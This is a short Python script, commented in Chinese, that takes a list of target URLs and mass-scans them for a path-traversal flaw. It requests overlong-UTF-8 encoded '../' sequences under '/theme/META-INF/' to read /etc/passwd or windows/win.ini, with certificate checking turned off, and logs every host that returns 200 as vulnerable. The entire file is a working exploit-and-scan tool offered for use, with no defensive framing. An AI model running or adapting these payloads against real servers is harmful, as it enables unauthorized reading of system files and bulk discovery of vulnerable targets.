import time
import requests
import urllib3
import os

os.environ['NO_PROXY'] = 'stackoverflow.com'
urllib3.disable_warnings()



def url_check(url):
    if "https://" not in url:
        if "http://" in url:
            url = url
        else:
            url = "http://" + url
    return url


def url_collect(url):
    # Linux系统的payload
    payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    # Windows系统的payload
    payload_windows = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    # 获取请求后返回源代码
    data_linux = requests.get(url=(url + payload_linux), verify=False)
    data_windows = requests.get(url=(url + payload_windows), verify=False)
    # 获取请求后的状态码
    resp_linux = data_linux.status_code
    resp_windows = data_windows.status_code
    #将存在漏洞的IP进行整合
    if resp_linux==200 or resp_windows==200:
        with open(r'ip.txt','a+') as x:
            x.write(url)
            x.close()
        print(url+'漏洞：存在!')
    else:
        print(url+'漏洞：不存在！！！！')


if __name__ == '__main__':
    with open(r'1.txt') as f:
        data = f.readlines()
        for url in data:
            url_collect(url_check(url))
